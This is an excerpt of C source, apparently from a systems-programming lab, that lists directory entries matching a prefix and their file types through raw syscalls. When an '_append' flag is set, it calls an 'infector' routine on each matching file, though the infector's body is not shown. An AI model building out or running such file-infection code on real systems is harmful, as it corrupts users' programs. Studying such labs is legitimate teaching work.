...
void printFile(char buffer[], int pos, ent *files);
char *getType(char buffer[], int pos, ent *file);

int _debug = 0, _append = 0;
...
void printFile(char buffer[], int pos, ent *files)
{
	...
	{
		if (strncmp(_prefix, files->name, strlen(_prefix)) == 0)
		{
			sys_call_handler(SYS_WRITE, STDOUT, (unsigned int)files->name, strlen(files[0].name));
			whitespace(STDIN);
			fileType = getType(buffer, pos, files);
			sys_call_handler(SYS_WRITE, STDOUT, (unsigned int)fileType, strlen(fileType));
			newline(STDIN);
			if(_append){
				infector(files->name);
			}
...
char *getType(char buffer[],int pos, ent *file)
{
	int type = *(buffer + pos + file->len - 1);
	switch (type)
	{
	case DT_FIFO:
		return "FIFO";
